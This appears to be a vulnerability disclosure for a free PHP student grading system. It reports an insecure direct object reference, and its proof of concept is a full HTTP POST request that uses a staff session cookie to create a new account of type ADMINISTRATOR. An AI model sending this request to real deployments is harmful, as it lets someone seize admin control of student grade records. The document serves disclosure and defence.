# Insecure Direct Object Reference (IDOR) in Student Grading System

## Vendor Homepage:
> https://www.campcodes.com/projects/php/student-grading-system-using-php-mysql-free-download/


## Proof of Concept
**HTTP Request Example**
``` http request
POST /grading/rms.php?page=users HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/grading/rms.php?page=users
Cookie:PHPSESSID=<staff cookie>
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

fname=tester&lname=staff&user=xx&pwd=xx123&type=ADMINISTRATOR
```

## Screenshot
![image](https://github.com/user-attachments/assets/c882ee49-210b-44f3-9354-906e9c4ac462)





## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
